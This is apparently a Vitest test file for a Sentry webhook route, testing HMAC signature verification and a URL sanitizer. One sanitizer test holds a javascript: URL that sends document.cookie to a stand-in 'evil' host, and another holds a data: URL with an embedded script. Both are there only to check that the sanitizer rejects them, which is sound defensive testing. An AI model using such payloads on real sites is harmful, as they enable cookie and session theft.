import { createHmac } from 'node:crypto';
import { describe, it, expect } from 'vitest';
import { sanitizeUrl, verifySentrySignature } from '../../src/infrastructure/http/routes/system-alert.routes.js';

const SECRET = 'test-sentry-webhook-secret';

function requestWith(rawBody: Buffer, signature?: string) {
  return {
    headers: signature ? { 'sentry-hook-signature': signature } : {},
    rawBody,
  } as never;
}

describe('verifySentrySignature', () => {
  it('acepta una firma HMAC-SHA256 válida del body crudo', () => {
    const body = Buffer.from(JSON.stringify({ level: 'error', message: 'boom' }));
    const signature = createHmac('sha256', SECRET).update(body).digest('hex');

    expect(verifySentrySignature(requestWith(body, signature), SECRET)).toBe(true);
  });

  it('rechaza una firma inválida', () => {
    const body = Buffer.from(JSON.stringify({ level: 'error', message: 'boom' }));
    expect(verifySentrySignature(requestWith(body, 'deadbeef'.repeat(8)), SECRET)).toBe(false);
  });

  it('rechaza cuando no viene ninguna firma', () => {
    const body = Buffer.from(JSON.stringify({ level: 'error', message: 'boom' }));
    expect(verifySentrySignature(requestWith(body), SECRET)).toBe(false);
  });

  it('rechaza una firma calculada con el body equivocado (payload manipulado)', () => {
    const original = Buffer.from(JSON.stringify({ level: 'error', message: 'boom' }));
    const signature = createHmac('sha256', SECRET).update(original).digest('hex');
    const tampered = Buffer.from(JSON.stringify({ level: 'fatal', message: 'boom' }));

    expect(verifySentrySignature(requestWith(tampered, signature), SECRET)).toBe(false);
  });
});

describe('sanitizeUrl', () => {
  it('acepta URLs http/https', () => {
    expect(sanitizeUrl('https://sentry.io/issues/123')).toBe('https://sentry.io/issues/123');
    expect(sanitizeUrl('http://localhost/x')).toBe('http://localhost/x');
  });

  it('descarta esquemas peligrosos (javascript:, data:) en vez de guardarlos', () => {
    expect(sanitizeUrl("javascript:fetch('//evil/steal?c='+document.cookie)")).toBeUndefined();
    expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBeUndefined();
  });

  it('descarta valores no-string o vacíos', () => {
    expect(sanitizeUrl(undefined)).toBeUndefined();
    expect(sanitizeUrl(123)).toBeUndefined();
    expect(sanitizeUrl('')).toBeUndefined();
  });
});
